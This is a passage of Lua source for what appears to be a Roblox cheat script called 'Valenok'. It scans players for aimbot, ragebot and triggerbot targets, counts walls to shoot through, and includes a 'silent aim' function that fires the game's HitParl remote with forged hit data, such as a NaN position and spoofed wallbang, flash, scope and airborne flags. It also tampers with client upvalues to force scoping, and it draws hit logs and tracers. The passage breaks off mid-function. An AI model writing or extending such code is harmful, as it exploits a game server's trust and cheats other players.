        if CombatScan.rageHitboxOn(group, selected) then
            for i = 1, #names do
                if names[i] == partName then return true end
            end
        end
    end
    return false
end

function CombatScan.rageHitboxes()
    local opt = Options.RagebotHitbox
    local value = opt and opt.Value
    if type(value) == "table" then return value end
    return CONSTANTS.RagebotDefaultHitboxes
end

function CombatScan.rageHitboxOn(name, selected)
    selected = selected or CombatScan.rageHitboxes()
    if type(selected) == "string" then return selected == name end
    if type(selected) ~= "table" then return name == "Head" end
    if selected[name] == true then return true end
    for _, v in pairs(selected) do
        if v == name then return true end
    end
    return false
end

function CombatScan.collectParts(character, head, rootPart, needRage, needAim, needTrigger)
    local parts, seen = {}, {}
    local function addPart(part)
        if part and part:IsA("BasePart") and not seen[part] then
            seen[part] = true
            parts[#parts + 1] = part
        end
    end
    local function addGroup(group)
        local names = CONSTANTS.AimHitboxFallbacks[group]
        if not names then return end
        for i = 1, #names do
            addPart(findCharacterPart(character, names[i]))
        end
    end
    if needRage then
        local any = false
        local rageHitboxes = CombatScan.rageHitboxes()
        for _, group in ipairs(CONSTANTS.RageHitboxPriority) do
            if CombatScan.rageHitboxOn(group, rageHitboxes) then
                any = true
                addGroup(group)
            end
        end
        if not any then addPart(head or rootPart) end
    end
    if needAim then
        local selected = Options.AimbotHitbox and Options.AimbotHitbox.Value or "Head"
        for _, group in ipairs(CONSTANTS.RageHitboxPriority) do
            if CombatScan.rageHitboxOn(group, selected) then
                addGroup(group)
            end
        end
    end
    if needTrigger then
        for i = 1, #TriggerMagnetParts do addPart(findCharacterPart(character, TriggerMagnetParts[i])) end
    end
    if #parts == 0 then addPart(head or rootPart) end
    return parts
end

function CombatScan.refresh(stamp)
    if CombatScan.stamp == stamp then return end
    CombatScan.stamp = stamp
    CombatScan.clear()

    local needRage = CombatScan.rageWanted()
    local needAim = CombatScan.aimWanted()
    local needTrigger = CombatScan.triggerWanted()
    if not needRage and not needAim and not needTrigger then return end

    local cam = getCamera()
    if not cam then return end

    local origin = cam.CFrame.Position
    local maxWalls = needRage and CombatScan.maxWallsAllowed() or 0
    CombatScan.origin = origin
    CombatScan.maxWalls = maxWalls

    local camLook = cam.CFrame.LookVector
    local nearestPlayer, nearestAng = nil, math.huge
    CombatScan.multiFrame = CombatScan.multiFrame + 1
    local allowMultiRay = (CombatScan.multiFrame % 3) == 0
    local multiEnabled = allowMultiRay and (
        (needRage and Toggles.RagebotMultiPoint and Toggles.RagebotMultiPoint.Value)
        or (needAim and Toggles.AimbotMultiPoint and Toggles.AimbotMultiPoint.Value)
        or (needTrigger and Toggles.TriggerbotMultiPoint and Toggles.TriggerbotMultiPoint.Value)
    )
    if multiEnabled then
        for _, player in ipairs(Players:GetPlayers()) do
            if player == LocalPlayer then continue end
            local character, humanoid, rootPart = getCachedCharacterParts(player)
            if not character or not humanoid or humanoid.Health <= 0 or not rootPart then continue end
            if hasShield(character) then continue end
            local enemyRage = needRage and isEnemyFor(player, Toggles.RagebotTeamCheck)
            local enemyAim = needAim and isEnemyFor(player, Toggles.AimbotTeamCheck)
            local enemyTrig = needTrigger and isEnemyFor(player, Toggles.TriggerbotTeamCheck)
            if not enemyRage and not enemyAim and not enemyTrig then continue end
            local delta = rootPart.Position - origin
            local mag = delta.Magnitude
            local ang = mag > 1e-4 and math.acos(math.clamp(camLook:Dot(delta / mag), -1, 1)) or math.huge
            if ang < nearestAng then
                nearestAng = ang
                nearestPlayer = player
            end
        end
    end

    local bestRageDist = math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        local character, humanoid, rootPart = getCachedCharacterParts(player)
        if not character or not humanoid or humanoid.Health <= 0 or not rootPart then continue end
        if hasShield(character) then continue end

        local enemyRage = needRage and isEnemyFor(player, Toggles.RagebotTeamCheck)
        local enemyAim = needAim and isEnemyFor(player, Toggles.AimbotTeamCheck)
        local enemyTrig = needTrigger and isEnemyFor(player, Toggles.TriggerbotTeamCheck)
        if not enemyRage and not enemyAim and not enemyTrig then continue end

        local useMulti = allowMultiRay and player == nearestPlayer and (
            (enemyRage and Toggles.RagebotMultiPoint and Toggles.RagebotMultiPoint.Value)
            or (enemyAim and Toggles.AimbotMultiPoint and Toggles.AimbotMultiPoint.Value)
            or (enemyTrig and Toggles.TriggerbotMultiPoint and Toggles.TriggerbotMultiPoint.Value)
        )

        local head = getCachedHead(player, character)
        local parts = CombatScan.collectParts(character, head, rootPart, enemyRage, enemyAim, enemyTrig)
        if #parts == 0 then continue end

        local primaryPart, primaryDist = parts[1], math.huge
        for i = 1, #parts do
            local part = parts[i]
            local delta = part.Position - origin
            local mag = delta.Magnitude
            local angDist = mag > 1e-4 and math.acos(math.clamp(camLook:Dot(delta / mag), -1, 1)) or math.huge
            if angDist < primaryDist then
                primaryDist = angDist
                primaryPart = part
            end
        end

        local bestPoint, bestWalls = CombatScan.findPoint(primaryPart, origin, maxWalls, useMulti)
        if not bestPoint then
            bestPoint = primaryPart.Position
            bestWalls = math.huge
        end

        local canHit = bestWalls <= maxWalls
        if not canHit and enemyRage then
            local ftPoint, ftWalls = CombatScan.tryForwardTrackHit(head, rootPart, origin, character, maxWalls)
            if ftPoint then
                bestPoint = ftPoint
                bestWalls = ftWalls
                canHit = true
            end
        end

        local delta = bestPoint - origin
        local mag = delta.Magnitude
        local angDist = mag > 1e-4 and math.acos(math.clamp(camLook:Dot(delta / mag), -1, 1)) or math.huge
        local entry = {
            player = player,
            character = character,
            humanoid = humanoid,
            root = rootPart,
            part = primaryPart,
            point = bestPoint,
            walls = bestWalls,
            canHit = canHit,
            strictPart = bestWalls == 0 and primaryPart or nil,
            strictPoint = bestWalls == 0 and bestPoint or nil,
            mouseDist = angDist,
        }
        CombatScan.byPlayer[player] = entry
        CombatScan.list[#CombatScan.list + 1] = entry

        if enemyRage and entry.canHit and entry.mouseDist < bestRageDist and not hasShield(character) then
            bestRageDist = entry.mouseDist
            CombatScan.ragePart = entry.part
            CombatScan.ragePoint = entry.point
            CombatScan.rageWalls = entry.walls
        end
    end

    if needRage and not RuntimePack.canCombatFire() then
        CombatScan.ragePart = nil
        CombatScan.ragePoint = nil
        CombatScan.rageWalls = math.huge
    end
end

function CombatScan.wallInfo(targetPart, aimPoint)
    local cam = getCamera()
    if not cam or not targetPart then return math.huge, false end
    local maxWalls = CombatScan.maxWallsAllowed()
    local pos = typeof(aimPoint) == "Vector3" and aimPoint or targetPart.Position
    local walls = getWallCount(cam.CFrame.Position, pos, maxWalls, targetPart.Parent)
    return walls, walls <= maxWalls
end

local RageHitLog = {
    MaxEntries = 5,
    LineHeight = 16,
    BaseOffset = 32,
    Entries = {},
    Texts = {},
    LastKey = "",
    LastTime = 0,
    Created = false,
    PendingWatch = {},
}

function RageHitLog.enabled()
    return Toggles.MiscHitLog and Toggles.MiscHitLog.Value
end

function RageHitLog.ensureText(index)
    local t = RageHitLog.Texts[index]
    if t then return t end
    local ok, created = pcall(Drawing.new, "Text")
    if not ok or not created then return nil end
    created.Visible, created.Center, created.Outline, created.Transparency = false, true, true, 1
    created.Size, created.Font, created.ZIndex = 13, 2, 3
    RageHitLog.Texts[index] = created
    return created
end

function RageHitLog.ensure()
    if RageHitLog.Created then return end
    for i = 1, RageHitLog.MaxEntries do
        RageHitLog.ensureText(i)
    end
    RageHitLog.Created = true
end

function RageHitLog.getHitboxLabel(part)
    if typeof(part) ~= "Instance" then return "Unknown" end
    local n = part.Name
    if type(n) ~= "string" then
        n = tostring(part)
    end
    if n == "HeadHB" or n == "FakeHead" or n == "Head" then return "Head" end
    if n == "UpperTorso" or n == "LowerTorso" or n == "Torso" or n == "HumanoidRootPart" then return "Body" end
    if string.find(n, "Arm", 1, true) or string.find(n, "Hand", 1, true) then return "Arms" end
    if string.find(n, "Leg", 1, true) or string.find(n, "Foot", 1, true) then return "Legs" end
    return n
end

function RageHitLog.prune(now)
    local kept = {}
    for _, entry in ipairs(RageHitLog.Entries) do
        if entry.holdUntil > now then
            kept[#kept + 1] = entry
        end
    end
    RageHitLog.Entries = kept
end

function RageHitLog.push(message, key, kind)
    if not RageHitLog.enabled() then return end
    local now = tick()
    if key and key == RageHitLog.LastKey and now - RageHitLog.LastTime < 0.08 then return end
    RageHitLog.LastKey = key or message
    RageHitLog.LastTime = now
    RageHitLog.prune(now)
    local life = Options.MiscHitLogLifetime and Options.MiscHitLogLifetime.Value or 3
    table.insert(RageHitLog.Entries, 1, {
        message = message,
        holdUntil = now + math.max(life, 0.3),
        kind = kind or "hit",
    })
    while #RageHitLog.Entries > RageHitLog.MaxEntries do
        table.remove(RageHitLog.Entries)
    end
end

function RageHitLog.extractReason(raw)
    if raw == nil then return nil end
    if type(raw) ~= "string" then raw = tostring(raw) end
    raw = raw:match("^%s*(.-)%s*$") or raw
    if raw == "" then return nil end

    local lower = string.lower(raw)
    local tagStart = lower:find("[hitreg feedback]", 1, true) or lower:find("[hitger feedback]", 1, true)
    local reason = raw
    if tagStart then
        reason = raw:sub(tagStart):match("%]%s*(.+)$") or raw:sub(tagStart)
    end

    reason = reason:gsub("%s*%(%d+%)$", "")
    reason = reason:match("^%s*(.-)%s*$")
    if not reason or reason == "" then return nil end
    return reason
end

function RageHitLog.logMiss(reason)
    if not RageHitLog.enabled() then return end
    if not reason or reason == "" then return end
    local message = "Missed due to " .. reason
    RageHitLog.push(message, "miss:" .. reason, "miss")
end

function RageHitLog.handleRemoteFeedback(msg)
    if not RageHitLog.enabled() then return end
    local reason = RageHitLog.extractReason(msg) or (msg ~= nil and tostring(msg):match("^%s*(.-)%s*$"))
    if reason and reason ~= "" then
        RageHitLog.logMiss(reason)
    end
end

function RageHitLog.installFeedbackHook()
    if RageHitLog.FeedbackConn then return end
    task.spawn(function()
        local events = ReplicatedStorage:FindFirstChild("Events") or ReplicatedStorage:WaitForChild("Events", 10)
        if not events or getgenv()._ValenokUnloading then return end
        local remote = events:FindFirstChild("DebugFeedback") or events:WaitForChild("DebugFeedback", 10)
        if not remote or getgenv()._ValenokUnloading then return end
        if RageHitLog.FeedbackConn then return end
        RageHitLog.FeedbackConn = remote.OnClientEvent:Connect(RageHitLog.handleRemoteFeedback)
    end)
end

function RageHitLog.clearPendingWatch()
    for uid, pending in pairs(RageHitLog.PendingWatch) do
        if pending and pending.conn then
            pcall(function() pending.conn:Disconnect() end)
        end
        RageHitLog.PendingWatch[uid] = nil
    end
end

function RageHitLog.logHit(player, hb, damage)
    if not RageHitLog.enabled() then return end
    local pName = tostring(player.Name)
    local hbStr = tostring(hb)
    local dmg = math.max(0, math.floor((damage or 0) + 0.5))
    local message = "Hit " .. pName .. " in " .. hbStr .. " (-" .. dmg .. " HP)"
    print("[Valenok] " .. message)
    RageHitLog.push(message, "hit:" .. pName .. ":" .. hbStr .. ":" .. dmg, "hit")
end

function RageHitLog.watchDamage(player, hb)
    local character = player.Character
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    local uid = player.UserId
    local pending = RageHitLog.PendingWatch[uid]
    if pending and pending.conn then
        pcall(function() pending.conn:Disconnect() end)
    end

    local healthBefore = hum.Health
    local conn
    conn = hum.HealthChanged:Connect(function(newHealth)
        if newHealth >= healthBefore then return end
        local damage = healthBefore - newHealth
        if damage <= 0 then return end
        RageHitLog.logHit(player, hb, damage)
        if conn then
            pcall(function() conn:Disconnect() end)
            conn = nil
        end
        RageHitLog.PendingWatch[uid] = nil
    end)

    RageHitLog.PendingWatch[uid] = { conn = conn, hum = hum }
    task.delay(0.4, function()
        if getgenv()._ValenokUnloading then
            local active = RageHitLog.PendingWatch[uid]
            if active and active.conn then pcall(function() active.conn:Disconnect() end) end
            RageHitLog.PendingWatch[uid] = nil
            return
        end
        local active = RageHitLog.PendingWatch[uid]
        if active and active.conn == conn then
            pcall(function() active.conn:Disconnect() end)
            RageHitLog.PendingWatch[uid] = nil
        end
    end)
end

function RageHitLog.logHitParl(hitPart)
    if not RageHitLog.enabled() then return end
    if typeof(hitPart) ~= "Instance" or not hitPart:IsA("BasePart") then return end
    if not hitPart.Parent then return end

    local model = hitPart:FindFirstAncestorOfClass("Model")
    if not model then return end

    local player = Players:GetPlayerFromCharacter(model)
    if not player or player == LocalPlayer then return end

    local hum = model:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    RageHitLog.watchDamage(player, RageHitLog.getHitboxLabel(hitPart))
end

function RageHitLog.draw(center)
    RageHitLog.ensure()
    local now = tick()
    if not RageHitLog.enabled() then
        for i = 1, RageHitLog.MaxEntries do
            local t = RageHitLog.Texts[i]
            if t then t.Visible = false end
        end
        return
    end
    RageHitLog.prune(now)
    for i = 1, RageHitLog.MaxEntries do
        local t = RageHitLog.ensureText(i)
        if not t then continue end
        local entry = RageHitLog.Entries[i]
        if entry then
            t.Text = entry.message
            t.Color = entry.kind == "miss" and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(80, 255, 120)
            t.Position = Vector2.new(center.X, center.Y + RageHitLog.BaseOffset + (i - 1) * RageHitLog.LineHeight)
            t.Visible = true
        else
            t.Visible = false
        end
    end
end

RageHitLog.installFeedbackHook()

do
    local function getHitParlRemote()
        local remote = HitpartSilent.remote
        if remote and remote.Parent then return remote end
        local events = ReplicatedStorage:FindFirstChild("Events")
        remote = events and events:FindFirstChild("HitParl") or nil
        HitpartSilent.remote = remote
        return remote
    end

    local function refreshHitpartContext(now)
        if now - HitpartSilent.lastCtxRefresh < 0.2 then return end
        HitpartSilent.lastCtxRefresh = now

        local char = LocalPlayer.Character
        local gun = char and char:FindFirstChild("Gun")
        local eq = char and char:FindFirstChild("EquippedTool")
        if gun and eq then
            local gunName = (type(eq.Value) == "string" and eq.Value ~= "" and eq.Value) or gun.Name
            if gunName ~= HitpartSilent.gunName or HitpartSilent.charGun ~= gun then
                HitpartSilent.gunName = gunName
                HitpartSilent.charGun = gun
                local weapons = getWeaponsFolder()
                HitpartSilent.gunData = weapons and weapons:FindFirstChild(gunName) or nil
                HitpartSilent.fireRateObj = nil
                HitpartSilent.lastFireRateRefresh = 0
            end
        else
            HitpartSilent.gunName = nil
            HitpartSilent.charGun = nil
            HitpartSilent.gunData = nil
            HitpartSilent.fireRateObj = nil
            HitpartSilent.fireRate = 0.1
        end

        local pg = getPlayerGui()
        local blnd = pg and pg:FindFirstChild("Blnd")
        local blind = blnd and blnd:FindFirstChild("Blind")
        HitpartSilent.flashed = blind and blind.BackgroundTransparency < 0.4 or false

        local gunData = HitpartSilent.gunData
        if gunData and gunData:FindFirstChild("snipo") then
            local gui = pg and (pg:FindFirstChild("GUI") or pg:FindFirstChild("Client"))
            local scope = nil
            if gui then
                local ch = gui:FindFirstChild("Crosshairs")
                scope = ch and ch:FindFirstChild("Scope")
            end
            HitpartSilent.noscope = not (scope and scope.Visible)
        else
            HitpartSilent.noscope = false
        end

        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            local state = hum:GetState()
            HitpartSilent.airborne = state == Enum.HumanoidStateType.Freefall
                or state == Enum.HumanoidStateType.Jumping
                or hum.FloorMaterial == Enum.Material.Air
        else
            HitpartSilent.airborne = false
        end

        if now - HitpartSilent.smokeFolderTick > 1 then
            HitpartSilent.smokeFolderTick = now
            local rayIgnore = Workspace:FindFirstChild("Ray_Ignore")
            HitpartSilent.smokeFolder = rayIgnore and rayIgnore:FindFirstChild("Smokes") or nil
            if HitpartSilent.smokeFolder then
                if not HitpartSilent.smokeParams then
                    HitpartSilent.smokeParams = RaycastParams.new()
                    HitpartSilent.smokeParams.FilterType = Enum.RaycastFilterType.Include
                    HitpartSilent.smokeParams.IgnoreWater = false
                end
                HitpartSilent.smokeParams.FilterDescendantsInstances = { HitpartSilent.smokeFolder }
            end
        end
    end

    local function isHitpartThroughSmoke(camPos, hitPos)
        local smokes = HitpartSilent.smokeFolder
        local params = HitpartSilent.smokeParams
        if not smokes or not params then return false end
        local hit = Workspace:Raycast(camPos, hitPos - camPos, params)
        return hit and hit.Instance and hit.Instance:GetAttribute("Enabled") and true or false
    end

    HitpartSilent.refreshMethod = function()
        HitpartSilent.isHitpart = true
        HitpartSilent.isRay = false
    end

    HitpartSilent.isHitpartMethod = function()
        HitpartSilent.isHitpart = true
        HitpartSilent.isRay = false
        return true
    end

    HitpartSilent.getFireRate = function()
        local now = tick()
        if now - HitpartSilent.lastFireRateRefresh >= 0.1 then
            HitpartSilent.lastFireRateRefresh = now
            local char = LocalPlayer.Character
            local gun = char and char:FindFirstChild("Gun")
            local eq = char and char:FindFirstChild("EquippedTool")
            if gun and eq then
                local gunName = (type(eq.Value) == "string" and eq.Value ~= "" and eq.Value) or gun.Name
                if gunName ~= HitpartSilent.gunName or HitpartSilent.charGun ~= gun or not HitpartSilent.gunData or not HitpartSilent.gunData.Parent then
                    HitpartSilent.gunName = gunName
                    HitpartSilent.charGun = gun
                    local weapons = getWeaponsFolder()
                    HitpartSilent.gunData = weapons and weapons:FindFirstChild(gunName) or nil
                    HitpartSilent.fireRateObj = nil
                end
            else
                HitpartSilent.gunName = nil
                HitpartSilent.charGun = nil
                HitpartSilent.gunData = nil
                HitpartSilent.fireRateObj = nil
            end
            local fr = HitpartSilent.fireRateObj
            if not fr or not fr.Parent then
                local gunData = HitpartSilent.gunData
                fr = gunData and gunData:FindFirstChild("FireRate") or nil
                HitpartSilent.fireRateObj = fr
            end
            if fr and fr:IsA("NumberValue") and fr.Value > 0 then
                HitpartSilent.fireRate = fr.Value
            else
                HitpartSilent.fireRate = 0.1
            end
        end
        local rate = HitpartSilent.fireRate
        if type(rate) == "number" and rate > 0 then return rate end
        return 0.1
    end

    HitpartSilent.fire = function(target, aimPoint)
        if HitpartSilent.injecting then return false end
        if not target or not target.Parent then return false end
        if not RuntimePack.silentActive then return false end
        if not RuntimePack.canCombatFire() then return false end
        local targetChar = target:FindFirstAncestorOfClass("Model") or target.Parent
        if hasShield(targetChar) then return false end
        if not (HitpartSilent.isHitpartMethod and HitpartSilent.isHitpartMethod()) then return false end

        local now = tick()
        local rate = HitpartSilent.getFireRate and HitpartSilent.getFireRate() or 0.1
        if now - HitpartSilent.lastFire < rate * 0.85 then return false end
        HitpartSilent.lastFire = now

        refreshHitpartContext(now)

        local gunName = HitpartSilent.gunName
        local charGun = HitpartSilent.charGun
        local gunData = HitpartSilent.gunData
        if not gunName then return false end
        local fireGun = charGun or gunData
        if not fireGun then return false end

        local hitParl = getHitParlRemote()
        if not hitParl then return false end

        local cam = getCamera()
        if not cam then return false end

        local hitPos = aimPoint
        if typeof(hitPos) ~= "Vector3" then
            hitPos = getgenv().PSilentAimPoint
        end
        if typeof(hitPos) ~= "Vector3" then
            hitPos = target.CFrame and target.CFrame.Position or target.Position
        end
        local camPos = cam.CFrame.Position
        local dir = hitPos - camPos
        local mag = dir.Magnitude
        if mag < 0.001 then return false end
        local normal = dir / mag
        local meleeRange = nil
        if gunData and gunData:FindFirstChild("Melee") then
            local rangeObj = gunData:FindFirstChild("Range")
            meleeRange = rangeObj and tonumber(rangeObj.Value) or 64
            meleeRange = math.clamp(meleeRange, 1, 64)
            if mag > meleeRange then return false end
        end

        local walls, canHit
        if target == CombatScan.ragePart and hitPos == CombatScan.ragePoint then
            walls = CombatScan.rageWalls
            canHit = walls <= CombatScan.maxWallsAllowed()
        else
            walls, canHit = CombatScan.wallInfo(target, hitPos)
        end
        if not canHit then return false end
        if isHitpartThroughSmoke(camPos, hitPos) then return false end

        local wallbang = walls > 0
        local smoke = isHitpartThroughSmoke(camPos, hitPos)
        local srvTime = Workspace:GetServerTimeNow()
        local rangeArg = meleeRange or 4096
        local posArg = { X = 0/0, Y = 0/0, Z = 0/0 }

        HitpartSilent.injecting = true
        local fired = false
        pcall(function()
            hitParl:FireServer(
                target,
                posArg,
                gunName,
                rangeArg,
                fireGun,
                nil,
                1,
                false,
                wallbang,
                camPos,
                srvTime,
                normal,
                HitpartSilent.flashed,
                HitpartSilent.noscope,
                smoke,
                HitpartSilent.airborne,
                true,
                nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil
            )
            fired = true
        end)
        HitpartSilent.injecting = false
        return fired
    end
end

local AutoScopeState = { lastWant = false }

local function isScopedGun(gun)
    return typeof(gun) == "Instance" and gun:FindFirstChild("Scoped") ~= nil
end

local function setADS(client, on)
    if not client or type(client.updateads) ~= "function" then return end
    pcall(debug.setupvalue, client.updateads, 1, on == true)
    if on == false then
        rawset(client, "doublezoom", false)
    end
    pcall(client.updateads)
end

local function isADS()
    local char = LocalPlayer.Character
    return char and char:FindFirstChild("AIMING") ~= nil
end

local ScopeLookParams = RaycastParams.new()
ScopeLookParams.FilterType = Enum.RaycastFilterType.Exclude
ScopeLookParams.IgnoreWater = true

local function lookingAtEnemyForScope()
    local cam = getCamera()
    if not cam then return false end

    local origin = cam.CFrame.Position
    local dir = cam.CFrame.LookVector * 2000
    local base = buildRayIgnoreList()
    local debris = Workspace:FindFirstChild("Debris")
    if debris then
        local ignore = table.create(#base + 1)
        for i = 1, #base do
            ignore[i] = base[i]
        end
        ignore[#base + 1] = debris
        ScopeLookParams.FilterDescendantsInstances = ignore
    else
        ScopeLookParams.FilterDescendantsInstances = base
    end

    getgenv().IgnoreRaycastHook = true
    local result = Workspace:Raycast(origin, dir, ScopeLookParams)
    getgenv().IgnoreRaycastHook = false
    if not result or not result.Instance then return false end

    local model = result.Instance:FindFirstAncestorOfClass("Model")
    if not model then return false end
    local plr = Players:GetPlayerFromCharacter(model)
    if not plr or not isEnemy(plr) then return false end

    local _, humanoid = getCachedCharacterParts(plr)
    if not humanoid or humanoid.Health <= 0 then return false end
    if hasShield(model) then return false end
    return true
end

local function updateAutoScope()
    local legitOn = Toggles.AimbotAutoScope and Toggles.AimbotAutoScope.Value
    local rageOn = Toggles.RagebotAutoScope and Toggles.RagebotAutoScope.Value
    if not legitOn and not rageOn then
        if AutoScopeState.lastWant then
            setADS(getCachedClient(), false)
            AutoScopeState.lastWant = false
        end
        return
    end

    local client = getCachedClient()
    if not client then return end

    local gun = rawget(client, "gun")
    if not isScopedGun(gun) then
        if AutoScopeState.lastWant then
            setADS(client, false)
            AutoScopeState.lastWant = false
        end
        return
    end

    local want = false
    if legitOn and lookingAtEnemyForScope() then
        want = true
    elseif rageOn then
        local tgt = getgenv().PSilentTarget
        if tgt and tgt.Parent then
            want = true
        elseif not RuntimePack.silentActive then
            want = CombatScan.ragePart ~= nil
        end
    end

    if want == AutoScopeState.lastWant then
        if want and not isADS() then
            setADS(client, true)
        end
        return
    end

    AutoScopeState.lastWant = want
    setADS(client, want)
end

local _hitSoundObj, PlayHitMarker

local HitMarkerState = {
    OutlineLines = {},
    FillLines = {},
    Gen = 0,
    Created = false,
    Fading = false,
    HoldUntil = 0,
    FadeStart = 0,
    FadeDuration = 0.3,
    HeartbeatConn = nil,
}

local BulletTracerState = {
    Folder = nil,
    Pool = {},
    Index = 1,
    Size = 20,
    Lifetime = 0.4,
}

local function ensureBulletTracerFolder()
    local f = BulletTracerState.Folder
    if f and f.Parent then return f end
    f = Instance.new("Folder")
    f.Name = "ValenokBulletTracers"
    f.Parent = Workspace:FindFirstChildOfClass("Terrain") or Workspace
    BulletTracerState.Folder = f
    return f
end

local function clearBulletTracers()
    for _, slot in pairs(BulletTracerState.Pool) do
        if slot.beam then slot.beam.Enabled = false end
    end
    if BulletTracerState.Folder then pcall(function() BulletTracerState.Folder:Destroy() end); BulletTracerState.Folder = nil end
    local leftover = Workspace:FindFirstChild("ValenokBulletTracers")
    if leftover then pcall(function() leftover:Destroy() end) end
    table.clear(BulletTracerState.Pool)
    BulletTracerState.Index = 1
end

local function getTracerMuzzlePosition(fallback)
    local cam = getCamera()
    if not cam then return fallback end
    local arms = cam:FindFirstChild("Arms")
    if arms then
        for _, n in ipairs({"FlashS", "2Flash", "Flash"}) do
            local flash = arms:FindFirstChild(n)
            if flash and flash:IsA("BasePart") and (n == "Flash" or flash.Transparency < 1) then
                return flash.Position
            end
        end
    end
    return fallback or cam.CFrame.Position
end

local function makeTracerAnchor(name, parent)
    local p = Instance.new("Part")
    p.Name, p.Anchored, p.CanCollide, p.CanQuery, p.CanTouch, p.CastShadow = name, true, false, false, false, false
    p.Transparency, p.Size, p.Parent = 1, Vector3.new(0.05, 0.05, 0.05), parent
    return p
end

getTracerSlot = function()
    local slot = BulletTracerState.Pool[BulletTracerState.Index]
    BulletTracerState.Index = (BulletTracerState.Index % BulletTracerState.Size) + 1
    if not slot then
        local folder = ensureBulletTracerFolder()
        slot = {
            p0 = makeTracerAnchor("TracerStart", folder),
            p1 = makeTracerAnchor("TracerEnd", folder),
            att0 = Instance.new("Attachment"),
            att1 = Instance.new("Attachment"),
            beam = Instance.new("Beam"),
            expire = 0,
        }
        slot.att0.Parent, slot.att1.Parent = slot.p0, slot.p1
        slot.beam.Attachment0, slot.beam.Attachment1 = slot.att0, slot.att1
        slot.beam.Parent = slot.p0
        BulletTracerState.Pool[#BulletTracerState.Pool + 1] = slot
    end
    return slot
end

updateBulletTracers = function(now)
    for _, slot in ipairs(BulletTracerState.Pool) do
        if slot.beam.Enabled and slot.expire <= now then
            slot.beam.Enabled = false
        end
    end
end

drawBulletTracer = function(startPos, endPos)
    if typeof(startPos) ~= "Vector3" or typeof(endPos) ~= "Vector3" then return end
    local cam = getCamera()
    local camPos = cam and cam.CFrame.Position or startPos
    startPos = getTracerMuzzlePosition(startPos)
    local shotDelta = endPos - camPos
    local shotMag = shotDelta.Magnitude
    if shotMag > 0.05 then endPos = startPos + shotDelta.Unit * shotMag end
    if (endPos - startPos).Magnitude < 0.15 then return end

    ensureBulletTracerFolder()
    local color = getOptionColor("MiscBulletTracerColor", Color3.fromRGB(150, 20, 60))
    local faceCamera = Toggles.MiscBulletTracerFaceCamera and Toggles.MiscBulletTracerFaceCamera.Value or false
    local texName = Options.MiscBulletTracerTexture and Options.MiscBulletTracerTexture.Value or "Solid"
    local texId = CONSTANTS.TracerTextureMap[texName] or CONSTANTS.TracerTextureMap.Solid
    local texture = type(texId) == "number" and ("rbxassetid://" .. texId) or texId

    local slot = getTracerSlot()
    slot.p0.CFrame, slot.p1.CFrame = CFrame.new(startPos), CFrame.new(endPos)
    local beam = slot.beam
    beam.Color = ColorSequence.new(color)
    beam.FaceCamera, beam.LightEmission, beam.LightInfluence = faceCamera and true or false, 1, 0
    beam.Width0, beam.Width1, beam.Texture = 0.18, 0.06, texture
    beam.TextureLength, beam.TextureMode, beam.TextureSpeed, beam.Segments = 1, Enum.TextureMode.Stretch, 0, 1
    beam.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.05), NumberSequenceKeypoint.new(0.85, 0.2), NumberSequenceKeypoint.new(1, 0.85),
    })
    beam.Enabled = true
    slot.expire = tick() + BulletTracerState.Lifetime
end

local GrenadeRuntime = {
    Folder = nil,
    Attachments = {},
    Beams = {},
    Sphere = nil,
    LmbDown = false,
    RmbDown = false,
    PulseVal = 1.0,
    PulseDir = 1,
    RP = nil,
    FilterList = nil,
    TrajectoryCache = {
        lastPos = nil,
        lastLook = nil,
        lastNadeType = nil,
        lastVel = nil,
        cachedPoints = nil,
        cachedSpherePos = nil,
        beamColor = nil,
    },
}

local function getLocalEquippedTool()
    local char = LocalPlayer.Character
    if not char then return nil end
    return char:FindFirstChild("EquippedTool")
end

local function isHoldingNade()
    local lp = LocalPlayer
    if not lp or not lp.Character then return false end
    local gun = lp.Character:FindFirstChild("Gun")
    if gun and gun:FindFirstChild("Grenade") then return true end
    local eqVal = getLocalEquippedTool()
    if eqVal and type(eqVal.Value) == "string" then
        local weaponDef = getWeaponsFolder()
        if weaponDef then
            local w = weaponDef:FindFirstChild(eqVal.Value)
            if w and w:FindFirstChild("Grenade") then return true end
        end
        local n = eqVal.Value:lower()
        if n:find("flash") or n:find("hegren") or n:find("smoke") or n:find("molotov") or n:find("incen") or n:find("decoy") or n:find("grenade") or n:find("nade") then
            return true
        end
    end
    return false
end

local function getNadePosition()
    local cam = getCamera()
    if not cam then return Vector3.new() end
    return (cam.CFrame * CFrame.new(0.1, -0.4, -2.5)).Position
end

local function getNadeType()
    local lp = LocalPlayer
    if not lp or not lp.Character then return "default" end
    local eqVal = getLocalEquippedTool()
    if not eqVal or type(eqVal.Value) ~= "string" then return "default" end
    local v = eqVal.Value
    if v == "Molotov" or v == "Incendiary Grenade" then return "molotov" end
    if v == "HE Grenade" then return "he" end
    if v == "Smoke Grenade" then return "smoke" end
    if v == "Flashbang" then return "flash" end
    if v == "Decoy Grenade" then return "decoy" end
    local lv = v:lower()
    if lv:find("molotov") or lv:find("incen") then return "molotov" end
    if lv:find("hegren") or lv == "he grenade" then return "he" end
    if lv:find("smoke") then return "smoke" end
    if lv:find("flash") then return "flash" end
    if lv:find("decoy") then return "decoy" end
    return "default"
end

local function ensureGrenadePredictionObjects()
    if GrenadeRuntime.Folder then return end
    local folder = Instance.new("Folder")
    folder.Name = "ValenokGrenadePredictor"
    if workspace and workspace.Terrain then folder.Parent = workspace.Terrain end
    GrenadeRuntime.Folder = folder
    for i = 1, 40 do
        local att = Instance.new("Attachment", folder)
        GrenadeRuntime.Attachments[i] = att
        if i > 1 then
            local beam = Instance.new("Beam", folder)
            beam.Attachment0, beam.Attachment1 = GrenadeRuntime.Attachments[i-1], att
            beam.Width0, beam.Width1, beam.FaceCamera, beam.Segments = 0.08, 0.08, true, 10
            beam.LightEmission, beam.LightInfluence = 1, 0
            beam.Transparency, beam.Enabled = NumberSequence.new(0.2), false
            GrenadeRuntime.Beams[i-1] = beam
        end
    end
    local sphere = Instance.new("Part")
    sphere.Shape, sphere.Size, sphere.Material = Enum.PartType.Ball, Vector3.new(1.2, 1.2, 1.2), Enum.Material.Neon
